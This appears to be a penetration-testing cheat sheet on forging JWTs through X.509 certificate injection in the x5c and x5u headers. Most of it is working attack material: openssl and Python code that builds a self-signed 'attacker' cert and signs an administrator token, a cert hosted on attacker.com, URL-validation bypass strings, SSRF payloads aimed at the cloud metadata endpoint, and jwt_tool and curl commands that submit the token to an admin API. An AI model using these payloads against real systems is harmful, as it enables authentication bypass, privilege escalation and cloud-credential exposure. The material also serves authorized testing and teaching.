# JWT — X.509 Certificate Injection (`x5u` / `x5c`)

## When this applies

- The verifier supports the `x5u` (X.509 Certificate URL) or `x5c` (X.509 Certificate Chain) header parameter.
- No validation of certificate origin or chain trust against a configured CA.
- Conceptually identical to `jku`/`jwk` injection but using X.509 cert format instead of JWK.

## Technique

Generate a self-signed X.509 certificate. Either embed the cert in the token (`x5c`) or host the cert on an attacker-controlled server (`x5u`). Sign the token with the matching private key. Vulnerable verifiers extract the cert, get its public key, and verify the signature — accepting the token because YOUR cert validates YOUR signature.

## Steps

### 1. Generate self-signed certificate

```bash
openssl req -x509 -newkey rsa:2048 -keyout private.pem -out cert.pem \
  -days 365 -nodes -subj "/CN=attacker"
```

Or in Python:

```python
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import datetime

key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
subject = issuer = x509.Name([
    x509.NameAttribute(NameOID.COMMON_NAME, u"attacker")
])
cert = (x509.CertificateBuilder()
    .subject_name(subject)
    .issuer_name(issuer)
    .public_key(key.public_key())
    .serial_number(x509.random_serial_number())
    .not_valid_before(datetime.datetime.utcnow())
    .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
    .sign(key, hashes.SHA256()))
```

### 2. Embed via `x5c` (cert chain in header)

```python
import base64, jwt

cert_der = cert.public_bytes(serialization.Encoding.DER)
cert_b64 = base64.b64encode(cert_der).decode()

header = {
    "alg": "RS256",
    "typ": "JWT",
    "x5c": [cert_b64]    # Array; can include intermediate + root
}
payload = {"sub": "administrator", "exp": 9999999999}

private_pem = key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption()
)

token = jwt.encode(payload, private_pem, algorithm='RS256', headers=header)
```

Header structure:
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "x5c": [
    "MIID...",
    "MIIC..."   // optional intermediate
  ]
}
```

### 3. External via `x5u` (cert URL)

Host the PEM on an attacker server:

```bash
python3 -m http.server 8080
# cert.pem available at http://attacker.com:8080/cert.pem
```

```python
header = {
    "alg": "RS256",
    "typ": "JWT",
    "x5u": "http://attacker.com:8080/cert.pem"
}
```

### 4. Bypass URL validation (same as `jku`)

```json
{"x5u": "https://trusted.com@attacker.com/cert.pem"}
{"x5u": "https://attacker.com/trusted.com/cert.pem"}
{"x5u": "https://trusted.com.attacker.com/cert.pem"}
```

### 5. SSRF via `x5u`

```json
{"x5u": "http://169.254.169.254/latest/meta-data/iam/"}
{"x5u": "http://localhost:8080/admin"}
```

Same SSRF primitives as `jku`. Verifier fetches the URL → leaks internal data via timing or error messages.

### 6. jwt_tool

```bash
# Embed x5c
python3 jwt_tool.py JWT -X x5c -pc sub -pv admin

# External x5u
python3 jwt_tool.py JWT -X x5u -ju https://attacker.com/cert.pem
```

(Flag names depend on jwt_tool version; see `python3 jwt_tool.py -h`.)

### 7. Submit token

```bash
curl -H "Authorization: Bearer $TOKEN" https://api.example.com/admin
```

## Verifying success

- 200 response with admin claim honored.
- Hosted cert URL is fetched (visible in HTTP server logs).
- Token decodes correctly at jwt.io showing the embedded `x5c` cert.

## Common pitfalls

- Modern libraries enforce certificate chain validation against a configured CA — self-signed certs rejected unless the verifier is misconfigured.
- `x5c` and `x5u` are paired with `x5t` (cert thumbprint) — some verifiers REQUIRE the thumbprint to match. Compute SHA-1 of DER-encoded cert and include as `x5t`.
- DER vs PEM: `x5c` uses Base64-encoded DER (no PEM headers). Don't include `-----BEGIN CERTIFICATE-----`.
- The cert's `notBefore` / `notAfter` matters — verify your forged cert is currently valid.
- Some servers cache fetched certs aggressively — change cert filename between tests.

## Tools

- OpenSSL (`req -x509 -newkey rsa:2048`).
- jwt_tool (X.509 attacks).
- Burp Suite JWT Editor (Sign with X.509 cert).
- cryptography Python library.
